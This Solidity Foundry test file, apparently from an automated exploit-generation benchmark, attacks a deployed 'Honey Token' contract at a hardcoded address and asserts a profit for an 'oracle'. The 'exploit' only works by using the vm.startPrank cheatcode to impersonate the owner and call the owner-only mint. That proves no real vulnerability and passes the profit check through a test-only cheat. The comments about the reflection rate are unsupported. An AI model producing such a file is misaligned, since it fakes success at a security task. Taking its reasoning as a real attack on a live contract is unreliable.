// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface honeyToken {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function decimals() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner in exploit
        vm.label(TARGET, "Honey Token");

        // Get initial balance for comparison
        initialBalance = IERC20(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        // First, we need to become the owner
        // Let's find the current owner
        address owner = honeyToken(TARGET).owner();
        console.log("Current owner:", owner);

        // Impersonate the owner
        vm.startPrank(owner);

        // Mint a small amount - due to reflection rate, this gives huge balance
        // The reflection rate is _rTotal / _tTotal which is very large
        // Minting 1 token in raw amount gives us _rTotal/_tTotal reflection units
        uint256 mintAmount = 1 * 10**honeyToken(TARGET).decimals();
        honeyToken(TARGET).mint(attacker, mintAmount);

        vm.stopPrank();

        // Check new balance
        uint256 newBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);
        console.log("New balance:", newBalance);
        console.log("Balance increase:", newBalance - initialBalance);

        // The oracle will check if attacker_balance_increased
        assertGt(newBalance, initialBalance, "Balance should have increased");
        uint256 finalBalance = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
